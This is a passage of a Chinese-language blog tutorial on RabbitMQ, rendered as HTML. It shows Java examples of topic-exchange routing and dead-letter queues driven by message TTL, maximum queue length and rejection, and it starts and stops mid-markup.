class="hljs-string">&quot;lazy.pink.rabbit&quot;</span>,<span class="hljs-string">&quot;虽然满足队列Q2的两个绑定但是只会被接收一次&quot;</span>);<br>        map.put(<span class="hljs-string">&quot;quick.orange.male.rabbit&quot;</span>,<span class="hljs-string">&quot;四个单词不匹配任何绑定会被丢弃&quot;</span>);<br><br>        <span class="hljs-keyword">for</span> (Map.Entry&lt;String, String&gt; bindingKeyEntry : map.entrySet()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">routingKey</span> <span class="hljs-operator">=</span> bindingKeyEntry.getKey();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> bindingKeyEntry.getValue();<br><br>            channel.basicPublish(EXCHANGE_NAME,routingKey,<span class="hljs-literal">null</span>,message.getBytes(StandardCharsets.UTF_8));<br>            System.out.println(<span class="hljs-string">&quot;生产者发送消息：&quot;</span>+ message );<br><br>        &#125;<br>     &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>消费者</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">* 声明主题交换机及相关队列</span><br><span class="hljs-comment">* 消费者C1</span><br><span class="hljs-comment">* */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReceiveLogsTopic01</span> &#123;<br>    <span class="hljs-comment">//交换机名称</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">EXCHANGE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;topic_logs&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>  <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br><br>        <span class="hljs-comment">//声明交换机</span><br>        channel.exchangeDeclare(EXCHANGE_NAME, BuiltinExchangeType.TOPIC);<br><br>        <span class="hljs-comment">//声明队列</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">queueName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Q1&quot;</span>;<br>        channel.queueDeclare(queueName,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">null</span>);<br><br>        <span class="hljs-comment">//队列捆绑</span><br>        channel.queueBind(queueName,EXCHANGE_NAME,<span class="hljs-string">&quot;*.orange.*&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;等待接收消息......&quot;</span>);<br><br>        <span class="hljs-type">DeliverCallback</span> <span class="hljs-variable">deliverCallback</span> <span class="hljs-operator">=</span> (consumerTag,message) -&gt; &#123;<br>            System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(message.getBody()));<br>            System.out.println(<span class="hljs-string">&quot;接收队列：&quot;</span>+ queueName + <span class="hljs-string">&quot;绑定键：&quot;</span> + message.getEnvelope().getRoutingKey());<br>        &#125;;<br><br>        <span class="hljs-comment">//接收消息</span><br>        channel.basicConsume(queueName,<span class="hljs-literal">true</span>,deliverCallback,consumerTag -&gt; &#123;&#125;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">* 声明主题交换机及相关队列</span><br><span class="hljs-comment">* 消费者C2</span><br><span class="hljs-comment">* */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ReceiveLogsTopic02</span> &#123;<br>    <span class="hljs-comment">//交换机名称</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">EXCHANGE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;topic_logs&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>  <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br><br>        <span class="hljs-comment">//声明交换机</span><br>        channel.exchangeDeclare(EXCHANGE_NAME, BuiltinExchangeType.TOPIC);<br><br>        <span class="hljs-comment">//声明队列</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">queueName</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Q2&quot;</span>;<br>        channel.queueDeclare(queueName,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">null</span>);<br><br>        <span class="hljs-comment">//队列捆绑</span><br>        channel.queueBind(queueName,EXCHANGE_NAME,<span class="hljs-string">&quot;*.*.rabbit&quot;</span>);<br>        channel.queueBind(queueName,EXCHANGE_NAME,<span class="hljs-string">&quot;*lazy.#&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;等待接收消息......&quot;</span>);<br><br>        <span class="hljs-type">DeliverCallback</span> <span class="hljs-variable">deliverCallback</span> <span class="hljs-operator">=</span> (consumerTag,message) -&gt; &#123;<br>            System.out.println(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(message.getBody()));<br>            System.out.println(<span class="hljs-string">&quot;接收队列：&quot;</span>+ queueName + <span class="hljs-string">&quot;绑定键：&quot;</span> + message.getEnvelope().getRoutingKey());<br>        &#125;;<br><br>        <span class="hljs-comment">//接收消息</span><br>        channel.basicConsume(queueName,<span class="hljs-literal">true</span>,deliverCallback,consumerTag -&gt; &#123;&#125;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>结果</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112194456980.png" alt="image-20230112194456980" /></p><p>​</p></li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112194512817.png" alt="image-20230112194512817" /></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112194521794.png" alt="image-20230112194521794" /></p><h1 id="7-死信队列"><a class="markdownIt-Anchor" href="#7-死信队列"></a> 7. 死信队列</h1><blockquote><p>概念</p></blockquote><ol><li>死信，顾名思义就是无法被消费的消息，字面意思可以这样理解，一般来说，producer将消息投递到 broker或者直接到queue里了,consumer 从 queue取出消息进行消费，<code>但某些时候由于特定的原因导致queue中的某些消息无法被消费</code>，这样的消息如果没有后续的处理，就变成了死信，有死信自然就有了死信队列。</li><li>应用场景：为了保证订单业务的消息数据不丢失，需要使用到RabbitMQ的死信队列机制，当消息消费发生异常时，将消息投入死信队列中.还有比如说:用户在商城下单成功并点击去支付后在指定时间未支付时自动失效</li></ol><blockquote><p>来源</p></blockquote><ol><li>消息TTL过期</li><li>队列达到最大长度（队列满了，无法再添加数据到mq中）</li><li>消息被拒绝（basic.reject或basic.nack）并且requeue=false</li></ol><blockquote><p>代码架构图</p></blockquote><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112194651527.png" alt="image-20230112194651527" /></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>过期时间<br>arguments.put(<span class="hljs-string">&quot;x-message-ttl&quot;</span>,<span class="hljs-number">1000</span>);<br><span class="hljs-regexp">//</span>正常队列设置死信队列<br>arguments.put(<span class="hljs-string">&quot;x-dead-letter-exchange&quot;</span>,DEAD_EXCHANGE);<br><span class="hljs-regexp">//</span>设置死信RoutingKey<br>arguments.put(<span class="hljs-string">&quot;x-dead-letter-routing-key&quot;</span>,<span class="hljs-string">&quot;lisi&quot;</span>);<br></code></pre></td></tr></table></figure><p><mark><code>key</code>是固定的</mark></p><blockquote><p>消息TTL过期</p></blockquote><ol><li><p>生产者</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">* 死信队列之生产者代码</span><br><span class="hljs-comment">*</span><br><span class="hljs-comment">* */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Producer</span> &#123;<br><br>    <span class="hljs-comment">//普通交换机的名称</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NORMAL_EXCHANGE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;normal_exchange&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br><br>        <span class="hljs-comment">//死信消息，设置TTL时间  单位是ms  10000ms是10s</span><br>        AMQP.<span class="hljs-type">BasicProperties</span> <span class="hljs-variable">properties</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AMQP</span>.BasicProperties().builder().expiration(<span class="hljs-string">&quot;10000&quot;</span>).build();<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;info&quot;</span> + i;<br>            channel.basicPublish(NORMAL_EXCHANGE,<span class="hljs-string">&quot;zhangsan&quot;</span>,properties,message.getBytes(StandardCharsets.UTF_8));<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>消费者</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">* 死信队列实战</span><br><span class="hljs-comment">* 消费者01</span><br><span class="hljs-comment">* */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Consumer01</span> &#123;<br><br>    <span class="hljs-comment">//普通交换机名称</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NORMAL_EXCHANGE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;normal_exchange&quot;</span>;<br><br>    <span class="hljs-comment">//死信交换机名称</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEAD_EXCHANGE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dead_exchange&quot;</span>;<br><br>    <span class="hljs-comment">//普通队列名称</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NORMAL_QUEUE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;normal_queue&quot;</span>;<br><br>    <span class="hljs-comment">//死信队列名称</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEAD_QUEUE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dead_queue&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span>  Exception&#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br><br>        <span class="hljs-comment">//声明死信和普通的交换机类型为direct</span><br>        channel.exchangeDeclare(NORMAL_EXCHANGE, BuiltinExchangeType.DIRECT);<br>        channel.exchangeDeclare(DEAD_EXCHANGE, BuiltinExchangeType.DIRECT);<br><br>        <span class="hljs-comment">//声明普通队列</span><br>        HashMap&lt;String, Object&gt; arguments = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>        <span class="hljs-comment">//过期时间</span><br>        arguments.put(<span class="hljs-string">&quot;x-message-ttl&quot;</span>,<span class="hljs-number">10000</span>);<br>        <span class="hljs-comment">//正常队列设置死信队列</span><br>        arguments.put(<span class="hljs-string">&quot;x-dead-letter-exchange&quot;</span>,DEAD_EXCHANGE);<br>        <span class="hljs-comment">//设置死信RoutingKey</span><br>        arguments.put(<span class="hljs-string">&quot;x-dead-letter-routing-key&quot;</span>,<span class="hljs-string">&quot;lisi&quot;</span>);<br><br>        <span class="hljs-comment">//声明死信和普通队列</span><br>        channel.queueDeclare(NORMAL_QUEUE,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,arguments);<br>        channel.queueDeclare(DEAD_QUEUE,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">null</span>);<br><br>        <span class="hljs-comment">//绑定普通的交换机与普通的队列</span><br>        channel.queueBind(NORMAL_QUEUE,NORMAL_EXCHANGE,<span class="hljs-string">&quot;zhangsan&quot;</span>);<br>        <span class="hljs-comment">//绑定死信的交换机与死信的队列</span><br>        channel.queueBind(DEAD_QUEUE,DEAD_EXCHANGE,<span class="hljs-string">&quot;lisi&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;等待接收消息......&quot;</span>);<br><br>        <span class="hljs-type">DeliverCallback</span> <span class="hljs-variable">deliverCallback</span> <span class="hljs-operator">=</span> (consumerTag,message) -&gt; &#123;<br>            System.out.println(<span class="hljs-string">&quot;Consumer01接收的消息是：&quot;</span> + <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(message.getBody()));<br>        &#125;;<br><br>        channel.basicConsume(NORMAL_QUEUE,<span class="hljs-literal">true</span>,deliverCallback,consumerTag-&gt;&#123;&#125;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">* 死信队列实战</span><br><span class="hljs-comment">* 消费者02</span><br><span class="hljs-comment">* */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Consumer02</span> &#123;<br><br>    <span class="hljs-comment">//死信队列名称</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEAD_QUEUE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;dead_queue&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span>  Exception&#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br>        System.out.println(<span class="hljs-string">&quot;等待接收消息......&quot;</span>);<br><br>        <span class="hljs-type">DeliverCallback</span> <span class="hljs-variable">deliverCallback</span> <span class="hljs-operator">=</span> (consumerTag,message) -&gt; &#123;<br>            System.out.println(<span class="hljs-string">&quot;Consumer02接收的消息是：&quot;</span> + <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(message.getBody()));<br>        &#125;;<br><br>        channel.basicConsume(DEAD_QUEUE,<span class="hljs-literal">true</span>,deliverCallback,consumerTag-&gt;&#123;&#125;);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>效果：启动生产者后，10条消息被传送到NORMAL_QUEUE，然后被传送到DEAD_QUEUE，此时启动消费者02，消息全被接收。</p></li></ol><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112210007005.png" alt="image-20230112210007005" /></p><p><strong>以上步骤完成后 启动 C2 消费者 它消费死信队列里面的消息</strong></p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112210827202.png" alt="image-20230112210827202" /></p><p>4.总结</p><ol><li><p>在消费者设置过期时间，可对整个队列的消息设置过期时间</p></li><li><p>在生成者设置过期时间，可对不同的消息设置不同的过期时间，自由度高。用该方式也比较多。</p></li><li><p>两者同时设置以消费者为准。（百度出来又不是这样，下文有。😱😱😱😱）设置使用到的API也不一样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.rabbitmq.client.AMQP;<br><span class="hljs-keyword">import</span> com.rabbitmq.client.Channel;<br><span class="hljs-keyword">import</span> io.xtwoy.utils.RabbitMqUtils;<br><br><span class="hljs-keyword">import</span> java.nio.charset.StandardCharsets;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 死信队列之生产者代码</span><br><span class="hljs-comment"> * [io.xtwoy.dead_letterqueue]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : [席子不会敲代码]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> : [V1.0]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> : [2023/1/12 19:52]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Producer</span> &#123;<br><br>    <span class="hljs-comment">//普通交换机的名称</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NORMAL_EXCHANGE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;normal_exchange&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br><span class="hljs-comment">//        channel.exchangeDeclare(NORMAL_EXCHANGE, BuiltinExchangeType.DIRECT);</span><br>        <span class="hljs-comment">//死信消息，设置TTL时间  单位是ms  10000ms是10s</span><br>        AMQP.<span class="hljs-type">BasicProperties</span> <span class="hljs-variable">properties</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AMQP</span>.BasicProperties().builder().expiration(<span class="hljs-string">&quot;1000&quot;</span>).build();<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;info&quot;</span> + i;<br>            channel.basicPublish(NORMAL_EXCHANGE,<span class="hljs-string">&quot;zhangsan&quot;</span>,<span class="hljs-literal">null</span>,message.getBytes(StandardCharsets.UTF_8));<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;info&quot;</span> + i;<br>            channel.basicPublish(NORMAL_EXCHANGE,<span class="hljs-string">&quot;zhangsan&quot;</span>,properties,message.getBytes(StandardCharsets.UTF_8));<br>        &#125;<br><br>        properties = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AMQP</span>.BasicProperties().builder().expiration(<span class="hljs-string">&quot;100000&quot;</span>).build();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;info&quot;</span> + i;<br>            channel.basicPublish(NORMAL_EXCHANGE,<span class="hljs-string">&quot;zhangsan&quot;</span>,properties,message.getBytes(StandardCharsets.UTF_8));<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><blockquote><p>队列达到最大长度</p></blockquote><ol><li><p>消息生产者代码去掉 TTL 属性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Producer</span> &#123;<br><br>    <span class="hljs-comment">//普通交换机的名称</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NORMAL_EXCHANGE</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;normal_exchange&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Channel</span> <span class="hljs-variable">channel</span> <span class="hljs-operator">=</span> RabbitMqUtils.getChannel();<br><span class="hljs-comment">//        channel.exchangeDeclare(NORMAL_EXCHANGE, BuiltinExchangeType.DIRECT);</span><br>        <span class="hljs-comment">//死信消息，设置TTL时间  单位是ms  10000ms是10s</span><br>        AMQP.<span class="hljs-type">BasicProperties</span> <span class="hljs-variable">properties</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AMQP</span>.BasicProperties().builder().expiration(<span class="hljs-string">&quot;1000&quot;</span>).build();<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;info&quot;</span> + i;<br>            channel.basicPublish(NORMAL_EXCHANGE,<span class="hljs-string">&quot;zhangsan&quot;</span>,<span class="hljs-literal">null</span>,message.getBytes(StandardCharsets.UTF_8));<br>        &#125;<br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>消费者</p><ul><li><p>消费者01 消费者修改以下代码(<strong>启动之后关闭该消费者 模拟其接收不到消息</strong>)</p></li><li><p><strong><mark>注意此时需要把原先队列删除 因为参数改变了</mark></strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//过期时间</span><br><span class="hljs-comment">//        arguments.put(&quot;x-message-ttl&quot;, 10000);</span><br>        <span class="hljs-comment">//正常队列设置死信队列</span><br>        arguments.put(<span class="hljs-string">&quot;x-dead-letter-exchange&quot;</span>, DEAD_EXCHANGE);<br>        <span class="hljs-comment">//设置死信RoutingKey</span><br>        arguments.put(<span class="hljs-string">&quot;x-dead-letter-routing-key&quot;</span>, <span class="hljs-string">&quot;lisi&quot;</span>);<br>        <span class="hljs-comment">//设置队列最长长度</span><br>        arguments.put(<span class="hljs-string">&quot;x-max-length&quot;</span>, <span class="hljs-number">6</span>);<br></code></pre></td></tr></table></figure></li><li><p>消费者02无需做修改</p></li></ul></li><li><p>效果：</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230112211459716.png" alt="image-20230112211459716" /></p></li></ol><blockquote><p>消息被拒绝</p></blockquote><ol><li><p>生产者代码无改变</p></li><li><p>消费者：</p><ul><li><p>C1 消费者代码(<strong>启动之后关闭该消费者 模拟其接收不到消息</strong>)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 